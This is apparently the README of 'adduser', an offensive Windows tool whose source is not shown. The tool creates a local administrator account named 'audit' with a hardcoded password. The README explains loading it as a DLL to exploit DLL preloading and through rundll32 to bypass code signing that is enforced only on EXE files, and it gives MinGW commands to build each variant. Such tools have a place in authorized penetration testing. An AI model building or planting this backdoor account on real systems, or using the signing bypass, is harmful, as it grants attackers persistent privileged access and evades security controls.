# adduser

Programmatically creates a 'local admin' Windows user. Requires admin rights. The created user is hardcoded to the following:

Login: `audit`
Password: `Test123456789!` (this should be good enough to fit most password policies)

This standalone piece code can run in many contexts:
- As a command-line EXE.
- As a DLL (the user will be created on DLL load). This is useful to exploit "DLL Preloading" issues.
- As a DLL, through `rundll32.exe adduser.dll,CreateAdminUser@16`. This is useful to bypass mandatory code signing applied to EXE files only.

## Compiling
### Using MinGW (tested on macOS, but Linux should work)

- Create a 32-bit EXE file:
`i686-w64-mingw32-gcc -oadduser32.exe adduser.c -lnetapi32`
- Create a 32-bit DLL file:
`i686-w64-mingw32-gcc -shared -oadduser32.dll adduser.c -lnetapi32`
- Create a 64-bit EXE file:
`x86_64-w64-mingw32-gcc -oadduser64.exe adduser.c -lnetapi32`
- Create a 64-bit DLL file:
`x86_64-w64-mingw32-gcc -shared -oadduser64.dll adduser.c -lnetapi32`
